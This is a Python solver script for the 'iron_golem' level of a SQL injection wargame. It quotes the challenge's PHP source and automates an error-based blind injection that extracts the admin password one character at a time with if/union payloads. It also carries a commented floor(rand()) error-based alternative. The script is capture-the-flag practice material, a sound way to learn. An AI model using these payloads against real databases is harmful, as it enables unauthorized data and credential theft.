#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return "select id from prob_iron_golem" in args[0]


def main():
    """
    Iron_Golem 21

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(mysqli_error($db)) exit(mysqli_error($db));
    echo "<hr>query : <strong>{$query}</strong><hr><br>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
    """

    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "'||if(length(pw)<%s,1,(select 1 union select 2))#"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"'||if(ord(mid(pw,%d,1))<%s,1,(select 1 union select 2))#"
    result = p.find_binary(check_func, len_of_key)
    # Alternative Error-Based SQL injection
    # payload = "||(select concat(floor(rand(33)*2),pw)x from (select 1 union select 2)t group by x having min(0))#"

    p.payload = result
    response = p.my_request()
    if 'Clear!' in response:
        print('\nIron_Golem Clear!')


if __name__ == '__main__':
    main()
